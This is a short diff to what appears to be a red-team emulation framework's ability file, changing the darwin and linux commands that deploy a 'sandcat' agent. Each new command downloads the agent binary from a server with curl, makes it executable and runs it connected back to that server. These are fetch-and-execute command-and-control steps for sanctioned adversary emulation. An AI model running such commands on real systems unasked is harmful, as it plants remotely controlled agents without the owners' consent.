@@ -12,8 +12,9 @@
       sh:
         command: |
           server="#{app.contact.http}";
-          curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download > sandcat.go;
-          ./$agent -server $server -v
+          curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download > sandcat.go;
+          chmod +x sandcat.go;
+          ./sandcat.go -server $server -v
         variations:
           - description: Deploy as a blue-team agent instead of red
             command: |
@@ -29,8 +30,9 @@
       sh:
         command: |
           server="#{app.contact.http}";
-          curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > sandcat.go;
-          ./$agent -server $server -group red -v
+          curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > sandcat.go;
+          chmod +x sandcat.go;
+          ./sandcat.go -server $server -group red -v
         variations:
           - description: Deploy as a blue-team agent instead of red
             command: |
